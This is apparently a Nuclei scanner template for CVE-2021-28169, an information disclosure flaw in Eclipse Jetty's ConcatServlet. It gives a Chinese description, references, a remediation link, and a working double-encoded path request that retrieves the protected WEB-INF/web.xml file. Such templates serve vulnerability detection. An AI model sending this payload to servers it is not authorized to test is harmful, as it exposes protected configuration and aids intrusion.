id: CVE-2021-28169
info:
  name: Jetty Utility Servlets Information Disclosure
  author:
  - l0ne1y
  tags:
  - cve
  - cve2021
  - jetty
  description: |-
    Jetty 通用 Servlets 组件 ConcatServlet双重编码路径请求导致信息泄露漏洞
    Eclipse Jetty 是 Eclipse 基金会的一个开源的、基于Java 的 Web 服务器和 Java Servlet 容器。
    Eclipse Jetty 中存在信息泄露漏洞，该漏洞源于通过对 ConcatServlet 的双重编码路径请求访问 WEB-INF 目录中的受保护资源。
  reference:
  - https://twitter.com/sec715/status/1406787963569065988
  - https://nvd.nist.gov/vuln/detail/cve-2021-28169
  - https://github.com/eclipse/jetty.project/security/advisories/ghsa-gwcr-j4wh-j3cq
  - https://lists.apache.org/thread.html/r2721aba31a8562639c4b937150897e24f78f747cdbda8641c0f659fe@%3cusers.kafka.apache.org%3e
  severity: medium
  classification:
    cve-id:
    - cve-2021-28169
    cwe-id:
    - cwe-200
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq
requests:
- matchers:
  - type: word
    part: header
    words:
    - application/xml
  - type: word
    condition: and
    part: body
    words:
    - </web-app>
    - java.sun.com
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/static?/%2557EB-INF/web.xml'
  - '{{BaseURL}}/concat?/%2557EB-INF/web.xml'
  method: GET
